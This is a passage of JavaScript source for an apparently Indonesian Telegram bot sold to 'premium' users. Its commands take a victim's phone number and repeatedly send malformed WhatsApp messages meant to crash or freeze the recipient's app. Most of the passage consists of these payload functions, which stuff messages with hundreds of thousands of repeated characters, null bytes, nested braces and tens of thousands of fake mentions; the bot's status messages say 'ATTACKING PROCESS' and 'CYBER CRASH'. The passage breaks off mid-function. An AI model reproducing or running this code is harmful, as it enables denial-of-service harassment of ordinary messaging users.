      await blank2(target);
      await blank1(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});

bot.command("Flowsql", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/NovaBeta 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 10; i++) {
      await CrlSqL(target);
      
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});

bot.command("delay2", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/delay2 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 50; i++) {
      await resd(target, false);
      
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});

bot.command("force2", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/force2 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 50; i++) {
      await OneMsgFlowX(target);    
        
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});

bot.command("forcloseone", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/forcloseone 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 100; i++) {
      await LocationFlowX2(target);
      await SaturnCursorV1(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});
//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Input user id.\nContoh: /addprem 123");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`${userId} you are premium〽️.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`${userId} finally become premium✨`);
});

bot.command('addadmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Input user id.\nContoh: /addadmin 123");
    }

    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`${userId} you are admin🌟.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`${userId} finally become admin ⚡`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("💢 input user id.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`💢 ${userId} not in premium list.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`💫 ${userId} has been removed from the premium list.`);
});

bot.command('deladmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("input user id.\nContoh: /deladmin 12345678");
    }

    const userId = args[1];

    if (!adminUsers.includes(userId)) {
        return ctx.reply(`💢 ${userId} not in admin list.`);
    }

    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`💦 ${userId} has been removed from the admin list.`);
});
// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✨ you are premium.`);
    } else {
        return ctx.reply(`💢 you are not premium.`);
    }
});

bot.command('cekidch', checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const username = ctx.from.username || ctx.from.first_name || "Pengguna";

  const args = ctx.message.text.split(" ").slice(1);
  const link = args.join(" ");

  if (!link) {
    return ctx.reply("⚠️ <b>Mohon sertakan link channel WhatsApp yang ingin dicek.</b>\n\n<i>Contoh: /cekidch https://whatsapp.com/channel/isagi123</i>", {
      parse_mode: "HTML"
    });
  }

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    ctx.reply(`⚠️ ${result.error}`);
  } else {
    let teks = `
<blockquote><b>Informasi Channel WhatsApp</b></blockquote>
<b>ID:</b> <code>${result.id}</code>
<b>Nama:</b> <code>${result.name}</code>
<b>Total Pengikut:</b> <code>${result.subscribers}</code>
<b>Status:</b> <code>${result.status}</code>
<b>Verified:</b> <code>${result.verified}</code>
    `;
    ctx.reply(teks, { parse_mode: "HTML" });
  }
});

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await Aii.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}

// Command untuk pairing WhatsApp
bot.command("addnova", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ wrong format use /addnova 628xxx>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Aii && Aii.user) {
        return await ctx.reply("WhatsApp is connected.");
    }

    try {
        const code = await Aii.requestPairingCode(phoneNumber, "KONTOL01")
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Failed to pair💢:'), error);
        await ctx.reply("❌ 𝐆𝐚𝐠𝐚𝐥 𝐦𝐞𝐥𝐚𝐤𝐮𝐤𝐚𝐧 𝐩𝐚𝐢𝐫𝐢𝐧𝐠. 𝐏𝐚𝐬𝐭𝐢𝐤𝐚𝐧 𝐧𝐨𝐦𝐨𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐯𝐚𝐥𝐢𝐝 𝐝𝐚𝐧 𝐝𝐚𝐩𝐚𝐭 𝐦𝐞𝐧𝐞𝐫𝐢𝐦𝐚 𝐒𝐌𝐒💫.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

//~~~~~~~~~~~~~~~~~~~FUNC BUG~~~~~~~~~~~~~~~~~~~~
async function CrlSqL(isTarget) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./console/media/song.mp4") },
    { upload: client.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "FnX-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "🧬⃟༑⌁⃰𝐓‌𝐚𝐦‌𝐚 𝐂𝐨𝐧‌‌𝐜𝐮‌𝐞𝐫𝐫𝐨𝐫ཀ‌‌🪅",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Finix AI Broadcast",
              body: "Trusted System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "FnX" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "Finix Engine",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://finix-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await Aii.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}

// UNTUK COMBOIN FUNCTION DI ATAS 
async function ComboInvisXAudioV2(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 999) {
            await Promise.all([
            InvisXAudioV2(target, true),
            ]);
            console.log(chalk.red(`Sucesfully Send ${count}/999 ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Sucesfully Send 999 Messages ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 999 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();
}

async function NovaInfinitycrash(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "( @XyrooAphocalips )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await Aii.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Aii.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "ThunderNova" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
  console.log(chalk.red("Cyber Crash Success Sending Delay Crash Bug"));
}

async function blank1(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "𝖙𝖍𝖚𝖓𝖉𝖊𝖗 𝖓𝖔𝖛𝖆 𝖎𝖘 𝖍𝖆𝖗𝖊..." + "ោ៝".repeat(10000),
      caption: "𝖙𝖍𝖚𝖓𝖉𝖊𝖗 𝖓𝖔𝖛𝖆 𝖎𝖘 𝖍𝖆𝖗𝖊..." + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await Aii.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function blank2(target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸..." + "ោ៝".repeat(10000),
      caption: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸..." + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await Aii.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}

async function VampCrashCH(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await Aii.relayMessage(target, msg.message, { 
    participant: { jid: target },
    messageId: msg.key.id 
  });
}

async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0000".repeat(92000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await Aii.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await Aii.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function EpX(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
            text: 'Who ?'
          },
          footer: {
            text: '{ yapping.json }'
          },
          nativeFlowMessage: {
            messageParamsJson: '',
            buttons: [
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: 'S4k',
                  url: 'https://clipper.com'
                })
              },
              {
                name: 'quick_reply',
                buttonParamsJson: JSON.stringify({
                  display_text: 'Fast Reply',
                  id: 'fast_reply'
                })
              }
            ]
          }
        },
        contextInfo: {
          participant: "0@s.whatsapp.net",
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "Sent",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: JSON.stringify({
                      "screen_2_OptIn_0": true,
                      "screen_2_OptIn_1": true,
                      "screen_1_Dropdown_0": "AditZxV",
                      "screen_1_DatePicker_1": "1028995200000",
                      "screen_1_TextInput_2": "Adityaa@gmail.com",
                      "screen_1_TextInput_3": "94643116",
                      "screen_0_TextInput_0": "radio - buttons" + "ꦾ".repeat(50000),
                      "screen_0_TextInput_1": "Why?",
                      "screen_0_Dropdown_2": "001-Grimgar",
                      "screen_0_RadioButtonsGroup_3": "0_true",
                      "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                    }),
                    version: 3
                  }
                }
              }
            }
          },
          remoteJid: "@s.whatsapp.net"
        }
      }
    }
  }, {});

  await Aii.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });

  console.log(chalk.green("Succesfully send bugs"));
}

async function VampNotif2(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸" + "ꦽ".repeat(9000) + "ꦾ".repeat(9000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "\u0003"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "\u0003"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await Aii.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.red("Cyber Crash Success Sending Bug"));
        }
        
        
const VampApiUi = JSON.stringify({
  status: true,
  criador: "VampireUI",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

async function VampNotifCrash(target) {
  Aii.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸\n\n" + "ꦽ".repeat(5000),
          hasMediaAttachment: false
        },
        body: {
          text: "ꦾ".repeat(5000) + "ꦽ".repeat(5000),
        },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(5000),
          buttons: [
            { name: "single_select", buttonParamsJson: VampApiUi },
            { name: "payment_method", buttonParamsJson: VampApiUi },
            { name: "form_message", buttonParamsJson: VampApiUi },
            { name: "catalog_message", buttonParamsJson: VampApiUi },
            { name: "send_location", buttonParamsJson: VampApiUi },
            { name: "review_and_pay", buttonParamsJson: VampApiUi }
          ]
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function spack2(target) {
console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5",
          name: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 "+ "ោ៝".repeat(30000),
          publisher: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(30000),
          caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
          stickers: [
            {
              fileName: "HzYPQ54bnDBMmI2Alpu0ER0fbVY6+QtvZwsLEkkhHNg=.webp",
              isAnimated: true,
              emojis: ["👾", "🩸"],
              accessibilityLabel: "@tamainfinity",
              stickerSentTs: "who know's ?",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            },
            {
              fileName: "GRBL9kN8QBxEWuJS3fRWDqAg4qQt2bN8nc1NIfLuv0M=.webp",
              isAnimated: false,
              emojis: ["🩸", "👾"],
              accessibilityLabel: "@tamainfinity_",
              stickerSentTs: "who know's ?",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            }
          ],
          fileLength: "728050",
          fileSha256: "jhdqeybzxe/pXEAT4BZ1Vq01NuHF1A4cR9BMBTzsLoM=",
          fileEncSha256: "+medG1NodVaMozb3qCx9NbGx7U3jq37tEcZKBcgcGyw=",
          mediaKey: "Wvlvtt7qAw5K9QIRjVR/vVStGPEprPr32jac0fig/Q0=",
          directPath: "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            mentionedJid: ["13135550002@s.whatsapp.net"],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            dataSharingContext: {
              showMmDisclosure: true
            },
            quotedMessage: {
              callLogMesssage: {
              isVideo: false,
              callOutcome: "REJECTED",
              durationSecs: "1",
              callType: "VOICE_CHAT",
                participants: [
                  { jid: target, callOutcome: "CONNECTED" },
                  { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" }
                ]
              }
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: true,
              id: "9741OURQ"
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(10),
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              thumbnailUrl: "https://files.catbox.moe/bqyia8.jpg",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          },
          packDescription: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(100000),
          jpegThumbnail: "https://files.catbox.moe/bqyia8.jpg",
          mediaKeyTimestamp: "1736088676",
          trayIconFileName: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5.png",
          thumbnailDirectPath: "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",

thumbnailSha256: "FQFP03spSHOSBUTOJkQg/phVS1I0YqtoqE8DoFZ/cmw=",
          thumbnailEncSha256: "OALtE35ViGAkU7DROBsJ1RK1dgma/dLcjpvUg62Mj8c=",
          thumbnailHeight: 999999999,
          thumbnailWidth: 999999999,
          imageDataHash: "c6a15de8c2d205c6b1b344476f5f1af69394a9698ed1f60cb0e912fb6a9201c4",
          stickerPackSize: "723949",
          stickerPackOrigin: "THIRD_PARTY"
        }
      }
    }
  }, { userJid: target });
  await Aii.relayMessage(
    target,
    msg.message,
    target
      ? { participant: { jid: target, messageId: msg.key.id } }
      : {}
  );
}

async function crashbeta(target, ptcp = false) {
let BetaFc = "KekuatanBatangHitam" + "ꦾ".repeat(250000);
